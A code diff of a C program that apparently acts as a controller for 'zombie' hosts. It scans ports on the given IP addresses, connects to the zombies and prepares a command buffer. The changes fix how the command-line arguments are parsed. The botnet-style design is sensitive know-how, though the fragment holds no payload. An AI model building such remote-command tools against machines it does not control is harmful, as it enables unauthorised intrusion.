@@ -32,14 +32,13 @@
 		int main(int argc, char *argv[])
 		{	
 	    	
-			printf("argv :  %s",*argv);
 			sigset_t set;
 	    	ssigemptyset(&set);
 	    	ssigaddset(&set,SIGPIPE);
 	    	ssigprocmask(SIG_BLOCK, &set, NULL);
 
 	    	ssigaction(SIGINT,done);
-			getPortIp(*argv,argc-1);
+			getPortIp(argv,argc);
 
 			getConnectedZombie();
 			char tabCommande [BUFFERSIZE];
@@ -76,16 +75,16 @@
 	skill(getppid(),SIGINT);	
 }
 
-		void getPortIp(char* ip,int numberOfIp){
+		void getPortIp(char** ip,int numberOfIp){
 			int indice=0;
-			for (int i = 0; i < numberOfIp; ++i){
+			for (int i = 1; i < numberOfIp; ++i){
 				for (int j = 0; j < 10; ++j){
 				int sock = ssocket();
 				struct sockaddr_in addr;
 				memset(&addr,0,sizeof(addr)); 
 				addr.sin_family = AF_INET;
 				addr.sin_port = htons(tabPorts[j]);
-				inet_aton(&ip[i],&addr.sin_addr);
+				inet_aton(ip[i],&addr.sin_addr);
 				int ret = connect(sock,
 				 (struct sockaddr *) &addr, sizeof(addr));
 				if(ret != -1){
